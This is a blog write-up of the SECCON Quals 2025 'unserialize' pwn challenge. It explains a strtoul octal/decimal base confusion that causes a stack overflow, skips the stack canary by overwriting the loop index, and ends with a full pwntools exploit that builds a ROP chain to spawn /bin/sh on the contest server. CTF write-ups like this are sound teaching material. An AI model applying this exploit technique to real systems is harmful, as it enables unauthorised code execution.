<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Seccon Quals 2025 - unserialize | leo_something</title>
<meta name="keywords" content="bof">
<meta name="description" content="Warmup challenge featuring a &ldquo;number conversion base confusion&rdquo;.">
<meta name="author" content="leo_something">
<link rel="canonical" href="http://leo1.cc/posts/writeups/seccon25-unserialize/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.62bb6a5e71ed8590b51185096e2d3dea8379889277e03fcf9ef8a01b0f6d9dc0.css" integrity="sha256-YrtqXnHthZC1EYUJbi096oN5iJJ34D/PnvigGw9tncA=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://leo1.cc/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://leo1.cc/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://leo1.cc/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://leo1.cc/apple-touch-icon.png">
<link rel="mask-icon" href="http://leo1.cc/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://leo1.cc/posts/writeups/seccon25-unserialize/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:url" content="http://leo1.cc/posts/writeups/seccon25-unserialize/">
  <meta property="og:site_name" content="leo_something">
  <meta property="og:title" content="Seccon Quals 2025 - unserialize">
  <meta property="og:description" content="Warmup challenge featuring a “number conversion base confusion”.">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-12-17T09:00:00+00:00">
    <meta property="article:modified_time" content="2025-12-17T09:00:00+00:00">
    <meta property="article:tag" content="Bof">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Seccon Quals 2025 - unserialize">
<meta name="twitter:description" content="Warmup challenge featuring a &ldquo;number conversion base confusion&rdquo;.">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "http://leo1.cc/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Seccon Quals 2025 - unserialize",
      "item": "http://leo1.cc/posts/writeups/seccon25-unserialize/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Seccon Quals 2025 - unserialize",
  "name": "Seccon Quals 2025 - unserialize",
  "description": "Warmup challenge featuring a \u0026ldquo;number conversion base confusion\u0026rdquo;.",
  "keywords": [
    "bof"
  ],
  "articleBody": "Overview The challenge consists in a simple c program that takes your input and “unserializes” it.\nint main() { char buf[0x100]; setbuf(stdin, NULL); setbuf(stdout, NULL); if (unserialize(stdin, buf, sizeof(buf)) \u003c 0) { puts(\"[-] Deserialization faield\"); } else { puts(\"[+] Deserialization success\"); } return 0; } The unserialize function looks like this.\nssize_t unserialize(FILE *fp, char *buf, size_t size) { char szbuf[0x20]; char *tmpbuf; for (size_t i = 0; i \u003c sizeof(szbuf); i++) { szbuf[i] = fgetc(fp); if (szbuf[i] == ':') { szbuf[i] = 0; break; } if (!isdigit(szbuf[i]) || i == sizeof(szbuf) - 1) { return -1; } } if (atoi(szbuf) \u003e size) { return -1; } tmpbuf = (char*)alloca(strtoul(szbuf, NULL, 0)); size_t sz = strtoul(szbuf, NULL, 10); for (size_t i = 0; i \u003c sz; i++) { if (fscanf(fp, \"%02hhx\", tmpbuf + i) != 1) { return -1; } } memcpy(buf, tmpbuf, sz); return sz; } This reads the input string until a : and converts it to an unsigned long size. Then it uses the size to allocate a buffer on the stack and finally lets us write arbitrary data into that buffer.\nVulnerability unserialize calls strtoul(szbuf, NULL, 0) to get the size for the buffer, but then it uses strtoul(szbuf, NULL, 10) to read the bytes inside it.\nFrom the man page of strtoul:\n[…] a zero base is taken as 10 (decimal) unless the next character is ‘0’, in which case it is taken as 8 (octal).\nWe can trigger a number base confusion (I just made up the name lmao) in unserialize, by giving a number that starts with 0. Another thing to notice in the man page is\nThe remainder of the string is converted to an unsigned long int value in the obvious manner, stopping at the first character which is not a valid digit in the given base.\nSo we can stop the conversion by giving an invalid octal number, for example 9. Our payload will look like this 0199: What will happen when unserialize is called is the following:\nthe part of the string before : is used every character is a digit, so the check passes (this is why we can’t input hexadecimal numbers, because they contain an x which is not a digit) atoi(szbuf) is 199, so the check passes now strtoul will decode our number as octal, returning 1 alloca(1) will allocate 0x10 bytes to keep the stack aligned strtoul is called with base 10 so we can get a stack overflow of 199-16 bytes NOTE: you could trick also atoi using 04294967296 (which is 0x100000000) and get a huge overflow, but I just realized it.\nExploitation The binary has No PIE and is statically compiled.\nWe have a stack BOF, we need to bypass the canary somehow. To better understand the stack layout I opened up IDA and decompiled it.\n// the overflow starts here unsigned __int64 v4; // rax void *tmpbuf; // rsp int v6; // r8d int v7; // r9d char v8[8]; // [rsp+8h] [rbp-70h] BYREF unsigned __int64 size; // [rsp+10h] [rbp-68h] __int64 buf; // [rsp+18h] [rbp-60h] __int64 fp; // [rsp+20h] [rbp-58h] unsigned __int64 i; // [rsp+28h] [rbp-50h] unsigned __int64 j; // [rsp+30h] [rbp-48h] char *v14; // [rsp+38h] [rbp-40h] unsigned __int64 v15; // [rsp+40h] [rbp-38h] _BYTE szbuf[40]; // [rsp+48h] [rbp-30h] BYREF unsigned __int64 canary; // [rsp+70h] [rbp-8h] We can overflow until j, which is the index of the last for loop in unserialize. Then override j with 0x87, this will trick the for loop into skipping some iterations and resume from the offset of the return address on the stack. Then we can just ROP. NOTE: we need to restore fp and buf while we overflow.\nFinal exploit #!/usr/bin/env python3 from pwn import * exe = ELF(\"./chall_patched\") context.binary = exe context.terminal = [\"alacritty\", \"-e\"] NC_CMD = \"nc unserialize.seccon.games 5000\" gdbscript = \\ \"\"\" \"\"\" def conn(): if args.LOCAL: r = process([exe.path]) elif args.GDB: r = gdb.debug([exe.path], gdbscript=gdbscript, aslr=True) else: r = remote(NC_CMD.split(\" \")[1], int(NC_CMD.split(\" \")[2])) return r def main(): r = conn() payload = b\"0199:\" # payload = b\"04294967296:\" r.send(payload) sleep(0.1) POP_RSI = 0x000000000043617e POP_RAX = 0x00000000004303ab SYSCALL = 0x0000000000415d36 rop_chain = flat(POP_RSI, 0, POP_RAX, 0x3b, SYSCALL) payload = b\"/bin/sh\\0\" + b\"A\"*0x18 + flat(0x4CA760, 0x4ca440) + b\"B\"*8 + p8(0x87) payload += rop_chain payload = payload.ljust(0x200, b\"\\0\") for i in range(len(payload)): r.sendline(payload[i].to_bytes().hex().encode()) r.interactive() if __name__ == \"__main__\": main() FLAG: SECCON{ev3rY_5tR1ng_c0nV3rs10n_wOrKs_1n_a_d1fFeR3n7_w4y}\n",
  "wordCount" : "724",
  "inLanguage": "en",
  "datePublished": "2025-12-17T09:00:00Z",
  "dateModified": "2025-12-17T09:00:00Z",
  "author":{
    "@type": "Person",
    "name": "leo_something"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://leo1.cc/posts/writeups/seccon25-unserialize/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "leo_something",
    "logo": {
      "@type": "ImageObject",
      "url": "http://leo1.cc/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://leo1.cc/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="http://leo1.cc/categories/" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="http://leo1.cc/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
            <li>
                <a href="http://leo1.cc/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      Seccon Quals 2025 - unserialize
    </h1>
    <div class="post-meta"><span title='2025-12-17 09:00:00 +0000 UTC'>December 17, 2025</span>&nbsp;·&nbsp;leo_something

</div>
  </header>
  <div class="tags" style="padding: 2px;">
    <div style="display: flex; flex-wrap: wrap; gap: 5px;">
      
      <a href="/tags/bof" class="custom-tag">
        bof
      </a>
      
    </div>
  </div>

  <div style="height: var(--gap);"></div> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#overview" aria-label="Overview">Overview</a></li>
                <li>
                    <a href="#vulnerability" aria-label="Vulnerability">Vulnerability</a></li>
                <li>
                    <a href="#exploitation" aria-label="Exploitation">Exploitation</a><ul>
                        
                <li>
                    <a href="#final-exploit" aria-label="Final exploit">Final exploit</a>
                </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h2 id="overview">Overview<a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h2>
<p>The challenge consists in a simple c program that takes your input and &ldquo;unserializes&rdquo; it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">0x100</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setbuf</span>(stdin, NULL);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setbuf</span>(stdout, NULL);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">unserialize</span>(stdin, buf, <span style="color:#66d9ef">sizeof</span>(buf)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;[-] Deserialization faield&#34;</span>);
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;[+] Deserialization success&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The <code>unserialize</code> function looks like this.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">ssize_t</span> <span style="color:#a6e22e">unserialize</span>(FILE <span style="color:#f92672">*</span>fp, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf, <span style="color:#66d9ef">size_t</span> size) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> szbuf[<span style="color:#ae81ff">0x20</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>tmpbuf;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">size_t</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">sizeof</span>(szbuf); i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    szbuf[i] <span style="color:#f92672">=</span> <span style="color:#a6e22e">fgetc</span>(fp);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (szbuf[i] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;:&#39;</span>) {
</span></span><span style="display:flex;"><span>      szbuf[i] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isdigit</span>(szbuf[i]) <span style="color:#f92672">||</span> i <span style="color:#f92672">==</span> <span style="color:#66d9ef">sizeof</span>(szbuf) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">atoi</span>(szbuf) <span style="color:#f92672">&gt;</span> size) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  tmpbuf <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)<span style="color:#a6e22e">alloca</span>(<span style="color:#a6e22e">strtoul</span>(szbuf, NULL, <span style="color:#ae81ff">0</span>));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> sz <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtoul</span>(szbuf, NULL, <span style="color:#ae81ff">10</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">size_t</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> sz; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">fscanf</span>(fp, <span style="color:#e6db74">&#34;%02hhx&#34;</span>, tmpbuf <span style="color:#f92672">+</span> i) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memcpy</span>(buf, tmpbuf, sz);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> sz;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This reads the input string until a <code>:</code> and converts it to an <code>unsigned long</code> size.
Then it uses the size to allocate a buffer on the stack and finally lets us write arbitrary data into that buffer.</p>
<h2 id="vulnerability">Vulnerability<a hidden class="anchor" aria-hidden="true" href="#vulnerability">#</a></h2>
<p><code>unserialize</code> calls <code>strtoul(szbuf, NULL, 0)</code> to get the size for the buffer, but then it uses <code>strtoul(szbuf, NULL, 10)</code> to read the bytes inside it.</p>
<p>From the <a href="https://linux.die.net/man/3/strtoul">man page of strtoul</a>:</p>
<blockquote>
<p>[&hellip;] a zero <em>base</em> is taken as 10 (decimal) unless the next character is &lsquo;0&rsquo;, in which case it is taken as 8 (octal).</p>
</blockquote>
<p>We can trigger a number base confusion (I just made up the name lmao) in <code>unserialize</code>, by giving a number that starts with <code>0</code>.
Another thing to notice in the man page is</p>
<blockquote>
<p>The remainder of the string is converted to an <em>unsigned long int</em> value in the obvious manner, stopping at the first character which is not a valid digit in the given base.</p>
</blockquote>
<p>So we can stop the conversion by giving an invalid octal number, for example <code>9</code>.
Our payload will look like this <code>0199:</code>
What will happen when <code>unserialize</code> is called is the following:</p>
<ol>
<li>the part of the string before <code>:</code> is used</li>
<li>every character is a digit, so the check passes (this is why we can&rsquo;t input hexadecimal numbers, because they contain an <code>x</code> which is not a digit)</li>
<li><code>atoi(szbuf)</code> is 199, so the check passes</li>
<li>now <code>strtoul</code> will decode our number as octal, returning <code>1</code></li>
<li><code>alloca(1)</code> will allocate 0x10 bytes to keep the stack aligned</li>
<li><code>strtoul</code> is called with base <code>10</code> so we can get a stack overflow of <code>199-16</code> bytes</li>
</ol>
<p><strong>NOTE:</strong> you could trick also <code>atoi</code> using <code>04294967296</code> (which is <code>0x100000000</code>) and get a huge overflow, but I just realized it.</p>
<h2 id="exploitation">Exploitation<a hidden class="anchor" aria-hidden="true" href="#exploitation">#</a></h2>
<p>The binary has <code>No PIE</code> and is statically compiled.</p>
<p>We have a stack BOF, we need to bypass the canary somehow. To better understand the stack layout I opened up IDA and decompiled it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// the overflow starts here 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v4; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>tmpbuf; <span style="color:#75715e">// rsp
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> v6; <span style="color:#75715e">// r8d
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> v7; <span style="color:#75715e">// r9d
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">char</span> v8[<span style="color:#ae81ff">8</span>]; <span style="color:#75715e">// [rsp+8h] [rbp-70h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> size; <span style="color:#75715e">// [rsp+10h] [rbp-68h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">__int64</span> buf; <span style="color:#75715e">// [rsp+18h] [rbp-60h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">__int64</span> fp; <span style="color:#75715e">// [rsp+20h] [rbp-58h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> i; <span style="color:#75715e">// [rsp+28h] [rbp-50h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> j; <span style="color:#75715e">// [rsp+30h] [rbp-48h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v14; <span style="color:#75715e">// [rsp+38h] [rbp-40h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v15; <span style="color:#75715e">// [rsp+40h] [rbp-38h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>_BYTE szbuf[<span style="color:#ae81ff">40</span>]; <span style="color:#75715e">// [rsp+48h] [rbp-30h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> canary; <span style="color:#75715e">// [rsp+70h] [rbp-8h]
</span></span></span></code></pre></div><p>We can overflow until <code>j</code>, which is the index of the last for loop in <code>unserialize</code>.
Then override <code>j</code> with <code>0x87</code>, this will trick the for loop into skipping some iterations and resume from the offset of the return address on the stack. Then we can just ROP.
<strong>NOTE:</strong> we need to restore <code>fp</code> and <code>buf</code> while we overflow.</p>
<h3 id="final-exploit">Final exploit<a hidden class="anchor" aria-hidden="true" href="#final-exploit">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./chall_patched&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;alacritty&#34;</span>, <span style="color:#e6db74">&#34;-e&#34;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NC_CMD <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;nc unserialize.seccon.games 5000&#34;</span>
</span></span><span style="display:flex;"><span>gdbscript <span style="color:#f92672">=</span> \
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">conn</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> process([exe<span style="color:#f92672">.</span>path])
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> args<span style="color:#f92672">.</span>GDB:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> gdb<span style="color:#f92672">.</span>debug([exe<span style="color:#f92672">.</span>path], gdbscript<span style="color:#f92672">=</span>gdbscript, aslr<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> remote(NC_CMD<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34; &#34;</span>)[<span style="color:#ae81ff">1</span>], int(NC_CMD<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34; &#34;</span>)[<span style="color:#ae81ff">2</span>]))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> conn()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0199:&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># payload = b&#34;04294967296:&#34;</span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>send(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    POP_RSI <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000043617e</span>
</span></span><span style="display:flex;"><span>    POP_RAX <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004303ab</span>
</span></span><span style="display:flex;"><span>    SYSCALL <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000415d36</span>
</span></span><span style="display:flex;"><span>    rop_chain <span style="color:#f92672">=</span> flat(POP_RSI, <span style="color:#ae81ff">0</span>, POP_RAX, <span style="color:#ae81ff">0x3b</span>, SYSCALL)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x18</span> <span style="color:#f92672">+</span> flat(<span style="color:#ae81ff">0x4CA760</span>, <span style="color:#ae81ff">0x4ca440</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p8(<span style="color:#ae81ff">0x87</span>)
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> rop_chain
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x200</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(payload)):
</span></span><span style="display:flex;"><span>        r<span style="color:#f92672">.</span>sendline(payload[i]<span style="color:#f92672">.</span>to_bytes()<span style="color:#f92672">.</span>hex()<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>interactive()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    main()
</span></span></code></pre></div><p><strong>FLAG:</strong> <code>SECCON{ev3rY_5tR1ng_c0nV3rs10n_wOrKs_1n_a_d1fFeR3n7_w4y}</code></p>


  </div>

  <footer class="post-footer">
  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="http://leo1.cc/">leo_something</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a><script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.6/medium-zoom.min.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>

<script>
    const images = Array.from(document.querySelectorAll(".post-content img"));
    images.forEach(img => {
        mediumZoom(img, {
            margin: 0,  
            scrollOffset: 40,  
            container: null,  
            template: null,  
            background: 'rgba(0, 0, 0, 0.8)'
        });
    });
</script>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
